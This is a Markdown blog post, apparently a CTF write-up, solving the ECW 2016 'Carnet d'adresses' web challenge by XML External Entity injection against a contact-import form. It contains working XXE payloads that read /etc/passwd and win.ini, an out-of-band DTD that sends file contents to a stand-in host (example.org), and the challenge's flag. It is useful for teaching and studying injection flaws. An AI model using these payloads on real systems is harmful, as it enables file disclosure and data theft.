@@ -1,0 +1,188 @@
+---
+layout: post
+title: "ECW - 150 - Carnet d'adresses - Web"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+date: 2016/11/06
+thumbnail: /images/security-265130_640.jpg
+---
+## Informations
+
+### Version
+
+| By    | Version | Comment
+| ---   | ---     | ---
+| noraj | 1.0     | Creation
+
+### CTF
+
+- **Name** : European Cyber Week CTF Quals 2016
+- **Website** : [challenge-ecw.fr](https://challenge-ecw.fr/)
+- **Type** : Online
+- **Format** : Jeopardy - Student
+
+### Description
+
+N.A.
+
+## Solution
+
+This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.
+
+[xxe](https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/)
+
+We are given the following form:
+
+```xml
+<contacts>
+  <contact>
+    <name>Jean Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue CTF</adress>
+    <zipcode>42000</zipcode>
+    <city>ECW</city>
+  </contact>
+  <contact>
+    <name>Jack Dupont</name>
+    <phone>01 02 03 04 05</phone>
+  </contact>
+</contacts>
+```
+
+And the following answer confirming the well formated XML request:
+
+```
+Création du fichier ./MNfloDfo.xml
+
+Import du fichier :
+
+    Importation de 'Jean Dupont' dans le carnet d'adresses
+    Importation de 'Jack Dupont' dans le carnet d'adresses
+
+Suppression du fichier ./MNfloDfo.xml
+```
+
+We should be able to leak data into the answer banner.
+
+Confirmation that entities are interpreted:
+
+```xml
+<!DOCTYPE contacts
+[<!ENTITY xxe "XXE vuln">]>
+<contacts>
+  <contact>
+    <name>&xxe;t</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue CTF</adress>
+    <zipcode>42000</zipcode>
+    <city>ECW</city>
+  </contact>
+  <contact>
+    <name>Jack Dupont</name>
+    <phone>01 02 03 04 05</phone>
+  </contact>
+</contacts>
+```
+
+```
+Création du fichier ./J2tuDR8g.xml
+
+Import du fichier :
+
+    Importation de 'XXE vulnt' dans le carnet d'adresses
+    Importation de 'Jack Dupont' dans le carnet d'adresses
+
+Suppression du fichier ./J2tuDR8g.xml
+```
+
+Nice that's working so try to leak some files:
+
+```xml
+<!DOCTYPE contacts
+[<!ENTITY xxe SYSTEM "http://example.org/test">]>
+```
+
+=> doesn't work
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+```
+
+=> doesn't work
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
+```
+
+=> doesn't work
+
+[...] and we tried a lot of logical filename on various operating systems.
+
+But how did we find out the right? The challenge required no logic but only guessing ...
+
+I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe:
+
+```
+<!DOCTYPE contacts [ <!ENTITY % pe SYSTEM "http://example.org/xxe_file"> %pe; %param1; ]>
+<contacts>
+  <contact>
+    <name>&external;</name>
+    [...]
+```
+
+`xxe_file`:
+
+```
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://example.org/log_xxe?data=%payload;'>">
+```
+
+And a tried a lot...
+
+But no, in fact no files were leakable exept `flag.txt`. It was impossible to find out it was just guessing because rules and description didn't mention any convention.
+
+I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked.
+
+Realistic challenge should have be better.
+
+But indeed some people find it realy easily as `flag.txt` can be common in CTF.
+
+I insist on the fact that's is only CTF guessing, in real life this never occurs.
+
+Here was the easy XXE :
+
+```xml
+<!DOCTYPE contacts
+[<!ENTITY xxe SYSTEM "flag.txt">]>
+<contacts>
+  <contact>
+    <name>&xxe;</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue CTF</adress>
+    <zipcode>42000</zipcode>
+    <city>ECW</city>
+  </contact>
+  <contact>
+    <name>Jack Dupont</name>
+    <phone>01 02 03 04 05</phone>
+  </contact>
+</contacts>
+```
+
+```
+Création du fichier ./WDpFYEM5.xml
+
+Import du fichier :
+
+    Importation de 'ECW{8dd72b9b3095380de595d734492d69c9} ' dans le carnet d'adresses
+    Importation de 'Jack Dupont' dans le carnet d'adresses
+
+Suppression du fichier ./WDpFYEM5.xml
+```
